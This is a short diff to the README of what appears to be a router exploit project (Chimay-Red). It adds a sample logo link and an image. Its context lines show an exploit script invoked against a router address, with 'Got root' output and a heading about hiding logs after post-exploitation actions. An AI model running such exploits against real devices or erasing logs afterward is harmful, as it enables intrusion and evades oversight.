@@ -149,6 +149,7 @@ BusyBox v1.28.1 (2018-02-15 14:34:02 CET) multi-call binary.
 ### Change boot logo
 Only RGB Bitmap 24 bit (not compressed) files are supported.  
 Max size: 160px width, 76px height  
+You can find a sample [here](docs/logo.bmp)  
 ```
 $ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary docs/logo.bmp /flash/boot/logo.bmp  
 [...]
@@ -161,7 +162,7 @@ Got root ;-)
 reboot
 *** Connection closed by remote host ***
 ```
-
+![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/boot_image.jpg)
 
 ### Hide logs
 To remove logs after your post exploitation actions
